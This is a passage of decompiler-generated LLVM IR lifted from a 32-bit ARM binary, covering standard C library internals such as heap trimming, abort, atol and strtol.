  %v0_14384.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14374

dec_label_pc_14374:                               ; preds = %dec_label_pc_14324, %dec_label_pc_14368
  %v0_14400 = phi i32 [ %v1_14330, %dec_label_pc_14324 ], [ %v2_14370, %dec_label_pc_14368 ]
  %v0_14384 = phi i32 [ %v3_14338, %dec_label_pc_14324 ], [ %v0_14384.pre, %dec_label_pc_14368 ]
  %v1_14398 = phi i32 [ %v2_14330, %dec_label_pc_14324 ], [ %v0_14380.pre, %dec_label_pc_14368 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14378 = load i32, i32* @r7, align 4
  %v2_14378 = add i32 %v0_14378, 64
  %v3_14378 = inttoptr i32 %v2_14378 to i32*
  %v4_14378 = load i32, i32* %v3_14378, align 4
  store i32 %v4_14378, i32* %r2.global-to-local, align 4
  %v1_1437c = add i32 %v4_14378, 44
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* %r3.global-to-local, align 4
  %v9_14380 = icmp eq i32 %v1_14398, %v3_1437c
  %v1_14384 = and i32 %v0_14384, -4
  store i32 %v1_14384, i32* %r0.global-to-local, align 4
  br i1 %v9_14380, label %dec_label_pc_14400, label %dec_label_pc_1438c

dec_label_pc_1438c:                               ; preds = %dec_label_pc_14374
  %v2_1438c = add i32 %v1_14398, %v1_14384
  store i32 %v2_1438c, i32* %r3.global-to-local, align 4
  %v1_14390 = add i32 %v2_1438c, 4
  %v2_14390 = inttoptr i32 %v1_14390 to i32*
  %v3_14390 = load i32, i32* %v2_14390, align 4
  store i32 %v3_14390, i32* %r3.global-to-local, align 4
  %v1_14394 = urem i32 %v3_14390, 2
  %v2_14394 = icmp eq i32 %v1_14394, 0
  %v2_14398 = add i32 %v1_14398, 4
  %v3_14398 = inttoptr i32 %v2_14398 to i32*
  store i32 %v1_14384, i32* %v3_14398, align 4
  br i1 %v2_14394, label %dec_label_pc_143a0, label %dec_label_pc_1438c.dec_label_pc_143d0_crit_edge

dec_label_pc_1438c.dec_label_pc_143d0_crit_edge:  ; preds = %dec_label_pc_1438c
  %v0_143e0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143d0

dec_label_pc_143a0:                               ; preds = %dec_label_pc_1438c
  %v0_143a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_143a0 = add i32 %v0_143a0, 8
  %v2_143a0 = inttoptr i32 %v1_143a0 to i32*
  %v3_143a0 = load i32, i32* %v2_143a0, align 4
  store i32 %v3_143a0, i32* %r1.global-to-local, align 4
  %v1_143a4 = add i32 %v3_143a0, 12
  %v2_143a4 = inttoptr i32 %v1_143a4 to i32*
  %v3_143a4 = load i32, i32* %v2_143a4, align 4
  store i32 %v3_143a4, i32* %r3.global-to-local, align 4
  %v9_143a8 = icmp eq i32 %v3_143a4, %v0_143a0
  %v1_143ac = add i32 %v0_143a0, 12
  %v2_143ac = inttoptr i32 %v1_143ac to i32*
  %v3_143ac = load i32, i32* %v2_143ac, align 4
  store i32 %v3_143ac, i32* %r2.global-to-local, align 4
  br i1 %v9_143a8, label %dec_label_pc_143b4, label %dec_label_pc_143c0

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143a0
  %v1_143b4 = add i32 %v3_143ac, 8
  %v2_143b4 = inttoptr i32 %v1_143b4 to i32*
  %v3_143b4 = load i32, i32* %v2_143b4, align 4
  store i32 %v3_143b4, i32* %r3.global-to-local, align 4
  %v9_143b8 = icmp eq i32 %v3_143b4, %v0_143a0
  br i1 %v9_143b8, label %dec_label_pc_143c4, label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143a0, %dec_label_pc_1435c, %dec_label_pc_14340, %dec_label_pc_143b4
  %v0_143c0 = call i32 @abort()
  store i32 %v0_143c0, i32* %r0.global-to-local, align 4
  %v0_143c4.pre = load i32, i32* @r1, align 4
  %v1_143c4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_143c4

dec_label_pc_143c4:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_143c0
  %v1_143c4 = phi i32 [ %v3_143ac, %dec_label_pc_143b4 ], [ %v1_143c4.pre, %dec_label_pc_143c0 ]
  %v0_143c4 = phi i32 [ %v3_143a0, %dec_label_pc_143b4 ], [ %v0_143c4.pre, %dec_label_pc_143c0 ]
  %v2_143c4 = add i32 %v1_143c4, 8
  %v3_143c4 = inttoptr i32 %v2_143c4 to i32*
  store i32 %v0_143c4, i32* %v3_143c4, align 4
  %v0_143c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_143c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_143c8 = add i32 %v1_143c8, 12
  %v3_143c8 = inttoptr i32 %v2_143c8 to i32*
  store i32 %v0_143c8, i32* %v3_143c8, align 4
  %v0_143cc = load i32, i32* %ip.global-to-local, align 4
  %v1_143cc = load i32, i32* %r0.global-to-local, align 4
  %v2_143cc = add i32 %v1_143cc, %v0_143cc
  store i32 %v2_143cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %dec_label_pc_1438c.dec_label_pc_143d0_crit_edge, %dec_label_pc_143c4
  %v0_143e0 = phi i32 [ %v0_143e0.pre, %dec_label_pc_1438c.dec_label_pc_143d0_crit_edge ], [ %v2_143cc, %dec_label_pc_143c4 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_143d4 = load i32, i32* @r7, align 4
  %v2_143d4 = add i32 %v0_143d4, 64
  %v3_143d4 = inttoptr i32 %v2_143d4 to i32*
  %v4_143d4 = load i32, i32* %v3_143d4, align 4
  %v1_143d8 = add i32 %v4_143d4, 52
  store i32 %v1_143d8, i32* %r3.global-to-local, align 4
  %v1_143dc = add i32 %v4_143d4, 60
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* %r1.global-to-local, align 4
  %v1_143e0 = or i32 %v0_143e0, 1
  store i32 %v1_143e0, i32* %r2.global-to-local, align 4
  %v1_143e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_143e4 = add i32 %v1_143e4, 12
  %v3_143e4 = inttoptr i32 %v2_143e4 to i32*
  store i32 %v1_143d8, i32* %v3_143e4, align 4
  %v0_143e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_143e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_143e8 = add i32 %v1_143e8, 8
  %v3_143e8 = inttoptr i32 %v2_143e8 to i32*
  store i32 %v0_143e8, i32* %v3_143e8, align 4
  %v0_143ec = load i32, i32* %r2.global-to-local, align 4
  %v1_143ec = load i32, i32* %r4.global-to-local, align 4
  %v2_143ec = add i32 %v1_143ec, 4
  %v3_143ec = inttoptr i32 %v2_143ec to i32*
  store i32 %v0_143ec, i32* %v3_143ec, align 4
  %v0_143f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_143f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_143f0 = add i32 %v1_143f0, %v0_143f0
  %v4_143f0 = inttoptr i32 %v3_143f0 to i32*
  store i32 %v0_143f0, i32* %v4_143f0, align 4
  %v0_143f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_143f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143f4 = add i32 %v1_143f4, 12
  %v3_143f4 = inttoptr i32 %v2_143f4 to i32*
  store i32 %v0_143f4, i32* %v3_143f4, align 4
  %v0_143f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_143f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_143f8 = add i32 %v1_143f8, 8
  %v3_143f8 = inttoptr i32 %v2_143f8 to i32*
  store i32 %v0_143f8, i32* %v3_143f8, align 4
  br label %dec_label_pc_14410

dec_label_pc_14400:                               ; preds = %dec_label_pc_14374
  %v2_14400 = add i32 %v1_14384, %v0_14400
  store i32 %v2_14400, i32* %ip.global-to-local, align 4
  %v1_14404 = or i32 %v2_14400, 1
  store i32 %v1_14404, i32* %r3.global-to-local, align 4
  %v0_14408 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14408, i32* %v2_1437c, align 4
  %v0_1440c = load i32, i32* %r3.global-to-local, align 4
  %v1_1440c = load i32, i32* %r4.global-to-local, align 4
  %v2_1440c = add i32 %v1_1440c, 4
  %v3_1440c = inttoptr i32 %v2_1440c to i32*
  store i32 %v0_1440c, i32* %v3_1440c, align 4
  br label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %dec_label_pc_143d0, %dec_label_pc_14400
  %v0_14410 = load i32, i32* %ip.global-to-local, align 4
  %v3_14414 = icmp ult i32 %v0_14410, 131070
  br i1 %v3_14414, label %dec_label_pc_14480, label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_14410
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1441c = load i32, i32* @r7, align 4
  %v2_1441c = add i32 %v0_1441c, 64
  %v3_1441c = inttoptr i32 %v2_1441c to i32*
  %v4_1441c = load i32, i32* %v3_1441c, align 4
  store i32 %v4_1441c, i32* @r4, align 4
  %v1_14420 = inttoptr i32 %v4_1441c to i32*
  %v2_14420 = load i32, i32* %v1_14420, align 4
  store i32 %v2_14420, i32* %r3.global-to-local, align 4
  %v1_14424 = and i32 %v2_14420, 2
  %v2_14424 = icmp eq i32 %v1_14424, 0
  br i1 %v2_14424, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14418
  store i32 %v4_1441c, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14418, %bb
  %v1_1442c = xor i1 %v2_14424, true
  call void @__pseudo_cond_branch(i1 %v1_1442c, i32 ptrtoint (i32* @global_var_140d0.480 to i32))
  %v0_14430 = load i32, i32* @r4, align 4
  %v1_14430 = add i32 %v0_14430, 44
  %v2_14430 = inttoptr i32 %v1_14430 to i32*
  %v3_14430 = load i32, i32* %v2_14430, align 4
  store i32 %v3_14430, i32* %r3.global-to-local, align 4
  %v1_14434 = add i32 %v3_14430, 4
  %v2_14434 = inttoptr i32 %v1_14434 to i32*
  %v3_14434 = load i32, i32* %v2_14434, align 4
  store i32 %v3_14434, i32* %r3.global-to-local, align 4
  %v1_14438 = add i32 %v0_14430, 836
  %v2_14438 = inttoptr i32 %v1_14438 to i32*
  %v3_14438 = load i32, i32* %v2_14438, align 4
  store i32 %v3_14438, i32* %r2.global-to-local, align 4
  %v1_1443c = and i32 %v3_14434, -4
  store i32 %v1_1443c, i32* %r3.global-to-local, align 4
  %v3_14440 = icmp ult i32 %v1_1443c, %v3_14438
  br i1 %v3_14440, label %dec_label_pc_14480, label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %bb16
  store i32 %v0_14430, i32* %r1.global-to-local, align 4
  %v1_1444c = add i32 %v0_14430, 840
  %v2_1444c = inttoptr i32 %v1_1444c to i32*
  %v3_1444c = load i32, i32* %v2_1444c, align 4
  store i32 %v3_1444c, i32* %r0.global-to-local, align 4
  %v2_14450 = call i32 @__malloc_trim(i32 %v3_1444c, i32 %v0_14430)
  store i32 %v2_14450, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14480

dec_label_pc_14458:                               ; preds = %dec_label_pc_1431c
  %v2_14458 = inttoptr i32 %v1_142ec to i32*
  %v3_14458 = load i32, i32* %v2_14458, align 4
  store i32 %v3_14458, i32* %r0.global-to-local, align 4
  %v1_1445c = add i32 %v4_142dc, 848
  %v2_1445c = inttoptr i32 %v1_1445c to i32*
  %v3_1445c = load i32, i32* %v2_1445c, align 4
  store i32 %v3_1445c, i32* %r2.global-to-local, align 4
  %v1_14460 = add i32 %v4_142dc, 868
  %v2_14460 = inttoptr i32 %v1_14460 to i32*
  %v3_14460 = load i32, i32* %v2_14460, align 4
  %v2_14464 = add i32 %v3_14458, %v1_142e8
  store i32 %v2_14464, i32* %r1.global-to-local, align 4
  %v1_14468 = add i32 %v3_1445c, -1
  store i32 %v1_14468, i32* %r2.global-to-local, align 4
  %v2_1446c = sub i32 %v3_14460, %v2_14464
  store i32 %v2_1446c, i32* %r3.global-to-local, align 4
  store i32 %v2_1446c, i32* %v2_14460, align 4
  %v1_14474 = load i32, i32* @lr, align 4
  %v2_14474 = add i32 %v1_14474, 848
  %v3_14474 = inttoptr i32 %v2_14474 to i32*
  store i32 %v1_14468, i32* %v3_14474, align 4
  %v0_14478 = load i32, i32* %r0.global-to-local, align 4
  %v1_14478 = load i32, i32* @r5, align 4
  %v2_14478 = sub i32 %v1_14478, %v0_14478
  store i32 %v2_14478, i32* %r0.global-to-local, align 4
  %v4_1447c = call i32 @munmap(i32 %v2_14478, i32 %v2_14464, i32 %v1_14468, i32 %v2_1446c)
  store i32 %v4_1447c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14480

dec_label_pc_14480:                               ; preds = %bb16, %dec_label_pc_14410, %dec_label_pc_14448, %dec_label_pc_142fc, %dec_label_pc_14458
  store i32 %v2_14290, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1448c = load i32, i32* @r7, align 4
  %v2_1448c = add i32 %v0_1448c, 44
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  %v4_1448c = load i32, i32* %v3_1448c, align 4
  store i32 %v4_1448c, i32* %ip.global-to-local, align 4
  store i32 83096, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1448c)
  br label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %entry, %dec_label_pc_14480
  store i32 %v3_14284, i32* @r4, align 4
  store i32 %v6_14284, i32* @r5, align 4
  store i32 %v9_14284, i32* @r6, align 4
  store i32 %v12_14284, i32* @r7, align 4
  store i32 %v18_14284, i32* @lr, align 4
  ret i32 %v2_14290

; uselistorder directives
  uselistorder i32 %v0_14430, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_143f0, { 1, 0 }
  uselistorder i32 %v1_14330, { 1, 0 }
  uselistorder i32 %v0_14330, { 1, 0 }
  uselistorder i32 %v3_14304, { 1, 0 }
  uselistorder i32 %v1_142e8, { 1, 0, 2 }
  uselistorder i32 %v2_142e4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_142dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1428c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14498, { 1, 0 }
  uselistorder label %dec_label_pc_14480, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_14410, { 1, 0 }
  uselistorder label %dec_label_pc_143d0, { 1, 0 }
  uselistorder label %dec_label_pc_143c4, { 1, 0 }
  uselistorder label %dec_label_pc_143c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14374, { 1, 0 }
}

define i32 @function_144a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_144a8:
  %v0_144a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_144a8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_144a8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_144a8, %bb
  %v4_144bc = phi i32 [ %arg1, %dec_label_pc_144a8 ], [ 0, %bb ]
  ret i32 %v4_144bc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_144c0 = load i32, i32* @r4, align 4
  store i32 %v3_144c0, i32* %stack_var_-12, align 4
  %v6_144c0 = load i32, i32* @r5, align 4
  %v4_144d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_144d0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_144d0, i32* @r0, align 4
  %v0_144e0 = call i32 @__malloc_consolidate()
  %v0_144e4 = load i32, i32* @r4, align 4
  %v0_144e8 = load i32, i32* @r5, align 4
  %v2_144f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_144f0, i32* @r4, align 4
  store i32 %v6_144c0, i32* @r5, align 4
  %v2_144f4 = call i32 @__malloc_trim(i32 %v0_144e4, i32 %v0_144e8)
  %v0_144f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_144f8, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_144fc = phi i32 [ %v2_144f4, %entry ], [ 0, %bb ]
  ret i32 %v4_144fc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r5, align 4
  %v4_14518 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 16) to i32*), align 4
  store i32 83236, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14518)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_14540 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_14548 = load i32, i32* @r5, align 4
  %v2_14548 = add i32 %v0_14548, 628
  %v3_14548 = inttoptr i32 %v2_14548 to i32*
  %v4_14548 = load i32, i32* %v3_14548, align 4
  %v2_1454c = icmp eq i32 %v4_14548, 0
  br i1 %v2_1454c, label %dec_label_pc_14554, label %dec_label_pc_14594

dec_label_pc_14554:                               ; preds = %entry
  store i32 1, i32* %v3_14548, align 4
  br label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_145a4, %dec_label_pc_14554
  %v0_14560 = load i32, i32* @r5, align 4
  %v2_14560 = add i32 %v0_14560, 208
  store i32 %v2_14560, i32* @r4, align 4
  %v2_1456c = add i32 %v0_14560, 68
  %v3_1456c = inttoptr i32 %v2_1456c to i32*
  %v4_1456c = load i32, i32* %v3_1456c, align 4
  call void @__pseudo_branch(i32 %v4_1456c)
  %v1_1457c = call i32 @__GI_raise(i32 6)
  %v0_14588 = load i32, i32* @r5, align 4
  %v2_14588 = add i32 %v0_14588, 16
  %v3_14588 = inttoptr i32 %v2_14588 to i32*
  %v4_14588 = load i32, i32* %v3_14588, align 4
  store i32 83348, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14588)
  %v0_14598.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14594

dec_label_pc_14594:                               ; preds = %entry, %dec_label_pc_1455c
  %v1_145ac = phi i32 [ %v0_14548, %entry ], [ %v0_14598.pre, %dec_label_pc_1455c ]
  %v2_14598 = add i32 %v1_145ac, 628
  %v3_14598 = inttoptr i32 %v2_14598 to i32*
  %v4_14598 = load i32, i32* %v3_14598, align 4
  %v7_1459c = icmp eq i32 %v4_14598, 1
  br i1 %v7_1459c, label %dec_label_pc_145a4, label %dec_label_pc_145e0

dec_label_pc_145a4:                               ; preds = %dec_label_pc_14594
  %v2_145a4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_145a4, i32* @r4, align 4
  store i32 2, i32* %v3_14598, align 4
  %v3_145bc = bitcast i32* %stack_var_-28 to i8*
  %v4_145bc = call i32 @__GI_memset(i8* %v3_145bc, i32 0, i32 20)
  %v3_145d8 = call i32 @__libc_sigaction(i32 6, i32 %v2_145a4, i32 0)
  br label %dec_label_pc_1455c

dec_label_pc_145e0:                               ; preds = %dec_label_pc_14594
  %v7_145e0 = icmp eq i32 %v4_14598, 2
  br i1 %v7_145e0, label %dec_label_pc_145e8, label %dec_label_pc_145f4

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145e0
  store i32 3, i32* %v3_14598, align 4
  %v0_145f0 = call i32 @abort()
  %v0_145f4.pre = load i32, i32* @r5, align 4
  %v1_145f4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_145f4

dec_label_pc_145f4:                               ; preds = %dec_label_pc_145e0, %dec_label_pc_145e8
  %v3_14600 = phi i32 [ 628, %dec_label_pc_145e0 ], [ %v1_145f4.pre, %dec_label_pc_145e8 ]
  %v2_14600 = phi i32 [ %v1_145ac, %dec_label_pc_145e0 ], [ %v0_145f4.pre, %dec_label_pc_145e8 ]
  %v2_145f4 = add i32 %v2_14600, %v3_14600
  %v3_145f4 = inttoptr i32 %v2_145f4 to i32*
  %v4_145f4 = load i32, i32* %v3_145f4, align 4
  %v7_145f8 = icmp eq i32 %v4_145f4, 3
  br i1 %v7_145f8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_145f4
  store i32 4, i32* %v3_145f4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_145f4, %bb
  call void @__pseudo_cond_branch(i1 %v7_145f8, i32 ptrtoint (i32* @global_var_161e0.489 to i32))
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %dec_label_pc_1460c, %.thread2
  %v0_1460c = call i32 @abort()
  br label %dec_label_pc_1460c

; uselistorder directives
  uselistorder i32* %v3_14598, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_145f4, { 1, 0 }
  uselistorder label %dec_label_pc_14594, { 1, 0 }
}

define i32 @function_14618(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14618:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_14618 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14618, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14618
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14618, %bb
  %v4_14624 = phi i32 [ %tmp, %dec_label_pc_14618 ], [ 0, %bb ]
  ret i32 %v4_14624

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_14638 = call i32 @strtol()
  ret i32 %v0_14638
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_14654 = call i32 @_stdlib_strto_l()
  ret i32 %v0_14654
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v0_14678 = load i32, i32* @r1, align 4
  store i32 %v0_14678, i32* %sb.global-to-local, align 4
  %v0_1467c = load i32, i32* @r2, align 4
  store i32 %v0_1467c, i32* %r5.global-to-local, align 4
  %v0_14680 = load i32, i32* @r0, align 4
  store i32 %v0_14680, i32* %r4.global-to-local, align 4
  %v0_14684 = load i32, i32* @r3, align 4
  br label %dec_label_pc_14690

dec_label_pc_1468c:                               ; preds = %dec_label_pc_14690
  %v1_1468c = add i32 %v0_146c8, 1
  store i32 %v1_1468c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %entry, %dec_label_pc_1468c
  %v0_146c8 = phi i32 [ %v0_14680, %entry ], [ %v1_1468c, %dec_label_pc_1468c ]
  %v1_14690 = inttoptr i32 %v0_146c8 to i8*
  %v2_14690 = load i8, i8* %v1_14690, align 1
  %v3_14690 = zext i8 %v2_14690 to i32
  store i32 %v3_14690, i32* %r1.global-to-local, align 4
  %v4_14694 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 272) to i32*), align 4
  %v2_14698 = mul nuw nsw i32 %v3_14690, 2
  %v2_1469c = add i32 %v2_14698, %v4_14694
  %v3_1469c = inttoptr i32 %v2_1469c to i16*
  %v4_1469c = load i16, i16* %v3_1469c, align 2
  %v1_146a0 = and i16 %v4_1469c, 32
  %v2_146a0 = icmp eq i16 %v1_146a0, 0
  br i1 %v2_146a0, label %dec_label_pc_146a8, label %dec_label_pc_1468c

dec_label_pc_146a8:                               ; preds = %dec_label_pc_14690
  %v7_146a8 = icmp eq i8 %v2_14690, 43
  br i1 %v7_146a8, label %dec_label_pc_146c8, label %dec_label_pc_146b0

dec_label_pc_146b0:                               ; preds = %dec_label_pc_146a8
  %v7_146b0 = icmp eq i8 %v2_14690, 45
  br i1 %v7_146b0, label %dec_label_pc_146c8, label %bb

bb:                                               ; preds = %dec_label_pc_146b0
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146cc

dec_label_pc_146c8:                               ; preds = %dec_label_pc_146a8, %dec_label_pc_146b0
  %storemerge47 = phi i32 [ 1, %dec_label_pc_146b0 ], [ 0, %dec_label_pc_146a8 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_146c8 = add i32 %v0_146c8, 1
  store i32 %v1_146c8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_146cc

dec_label_pc_146cc:                               ; preds = %bb, %dec_label_pc_146c8
  %v0_146ec = phi i32 [ %v0_146c8, %bb ], [ %v1_146c8, %dec_label_pc_146c8 ]
  %v1_146cc = and i32 %v0_1467c, -17
  %v3_146cc = icmp eq i32 %v1_146cc, 0
  br i1 %v3_146cc, label %dec_label_pc_146d8, label %bb60

bb60:                                             ; preds = %dec_label_pc_146cc
  br label %bb64

dec_label_pc_146d8:                               ; preds = %dec_label_pc_146cc
  %v1_146d8 = inttoptr i32 %v0_146ec to i8*
  %v2_146d8 = load i8, i8* %v1_146d8, align 1
  %v7_146dc = icmp eq i8 %v2_146d8, 48
  %v1_146e0 = add i32 %v0_1467c, 10
  store i32 %v1_146e0, i32* %r5.global-to-local, align 4
  br i1 %v7_146dc, label %dec_label_pc_146ec, label %bb61

bb61:                                             ; preds = %dec_label_pc_146d8
  br label %.thread8

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146d8
  %v1_146ec = add i32 %v0_146ec, 1
  %v2_146ec = inttoptr i32 %v1_146ec to i8*
  %v3_146ec = load i8, i8* %v2_146ec, align 1
  %v4_146ec = zext i8 %v3_146ec to i32
  store i32 %v1_146ec, i32* %r4.global-to-local, align 4
  %v1_146f0 = or i32 %v4_146ec, 32
  %v7_146f4 = icmp eq i32 %v1_146f0, 120
  %v1_146f8 = add i32 %v0_1467c, 8
  store i32 %v1_146f8, i32* %r5.global-to-local, align 4
  br i1 %v7_146f4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_146ec
  %v3_14704 = mul i32 %v1_146f8, 2
  store i32 %v3_14704, i32* %r5.global-to-local, align 4
  %v2_14708 = add i32 %v0_146ec, 2
  store i32 %v2_14708, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_146ec, %bb61, %bb62
  %v1_147dc30 = phi i32 [ %v0_14680, %bb61 ], [ %v1_146ec, %bb62 ], [ %v1_146ec, %dec_label_pc_146ec ]
  %v0_1475821 = phi i32 [ %v0_146ec, %bb61 ], [ %v2_14708, %bb62 ], [ %v1_146ec, %dec_label_pc_146ec ]
  %v0_1470c = phi i32 [ %v1_146e0, %bb61 ], [ %v3_14704, %bb62 ], [ %v1_146f8, %dec_label_pc_146ec ]
  %v5_14710 = icmp slt i32 %v0_1470c, 16
  br i1 %v5_14710, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_147dc29 = phi i32 [ %v0_14680, %bb60 ], [ %v1_147dc30, %.thread8 ], [ %v1_147dc30, %bb63 ]
  %v0_1475820 = phi i32 [ %v0_146ec, %bb60 ], [ %v0_1475821, %.thread8 ], [ %v0_1475821, %bb63 ]
  %v0_14738 = phi i32 [ %v0_1467c, %bb60 ], [ %v0_1470c, %.thread8 ], [ 16, %bb63 ]
  %v1_14714 = add i32 %v0_14738, -2
